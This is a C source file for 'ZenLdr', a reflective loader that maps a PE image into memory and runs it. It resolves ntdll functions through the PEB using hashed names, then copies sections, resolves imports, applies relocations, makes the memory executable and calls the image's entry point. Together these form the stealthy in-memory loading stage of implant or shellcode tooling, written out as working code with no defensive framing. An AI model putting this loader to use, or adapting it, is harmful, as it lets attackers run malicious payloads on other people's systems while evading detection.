#include "General.h"

GRP_SEC(B) VOID WINAPI ZenLdr(VOID) {

	PIMAGE_DATA_DIRECTORY		DataDir = NULL; 
	PIMAGE_SECTION_HEADER		SecHeader = NULL; 
	PIMAGE_NT_HEADERS			NtHeaders = NULL; 
	PIMAGE_DOS_HEADER			DosHeader = NULL; 

	ZenDllMain	ZenEntry = NULL; 
	NTSTATUS	Status = STATUS_SUCCESS; 
	RESOLVE		Resolve = { 0 }; 

	SIZE_T		SecSize = 0;
	SIZE_T		ZenImageSize = 0; 
	SIZE_T		Protections = 0; 
	PVOID		ZenBaseAddress = NULL; 

	/* Resolve api calls and modules used */
	
	Resolve.Dll.Ntdll = LoadPebModule(NTDLL_HASH);

	Resolve.Function.NtAllocateVirtualMemory	= LoadExports(Resolve.Dll.Ntdll, NTALLOCATEVIRTUALMEMORY_HASH);

	Resolve.Function.NtProtectVirtualMemory		= LoadExports(Resolve.Dll.Ntdll, NTPROTECTVIRTUALMEMORY_HASH);
	
	/* Find starting point of PE in target process memory */

	DosHeader = (PIMAGE_DOS_HEADER)CODE_END(); 

	NtHeaders = CONVERT(PIMAGE_NT_HEADERS, DosHeader, DosHeader->e_lfanew); 
	
	/* Copy sections from PE image to new allocated section in target process memory*/
	
	ZenImageSize = NtHeaders->OptionalHeader.SizeOfImage; 

	Status = Resolve.Function.NtAllocateVirtualMemory(NtCurrentProcess(), &ZenBaseAddress, 0, &ZenImageSize, MEM_COMMIT, PAGE_READWRITE); 

	if (NT_SUCCESS(Status)) {

		SecHeader = IMAGE_FIRST_SECTION(NtHeaders); 

		SIZE_T Index = 0; 
		while (Index < NtHeaders->FileHeader.NumberOfSections) {

			MemCpy
			(
				
				(PBYTE)ZenBaseAddress + SecHeader[Index].VirtualAddress,
				(PBYTE)DosHeader + SecHeader[Index].PointerToRawData,
				SecHeader[Index].SizeOfRawData
			);

			Index++; 
		}
		
		/* Initialise imports and apply relocations */

		DataDir = &NtHeaders->OptionalHeader.DataDirectory[1]; 

		if (DataDir->VirtualAddress) {

			LoadImports((PVOID)ZenBaseAddress, CONVERT(PVOID, ZenBaseAddress, DataDir->VirtualAddress)); 
		}

		DataDir = &NtHeaders->OptionalHeader.DataDirectory[5];

		if (DataDir->VirtualAddress) {

			LoadRelocations((PVOID)ZenBaseAddress, CONVERT(PVOID, ZenBaseAddress, DataDir->VirtualAddress), NtHeaders->OptionalHeader.ImageBase);
		}
		
		/* Change memory page permissions, set up entry point of image and execute */

		SecSize = SecHeader->SizeOfRawData; 

		Status = Resolve.Function.NtProtectVirtualMemory(NtCurrentProcess(), &ZenBaseAddress, &SecSize, PAGE_EXECUTE_READ, &Protections); 

		if (NT_SUCCESS(Status)) {

			ZenEntry = CONVERT(ZenDllMain, ZenBaseAddress, NtHeaders->OptionalHeader.AddressOfEntryPoint); 
			ZenEntry(SYMBOL(Start), 1, NULL); 
			ZenEntry(SYMBOL(Start), 4, NULL);
		}
	}

	return; 

}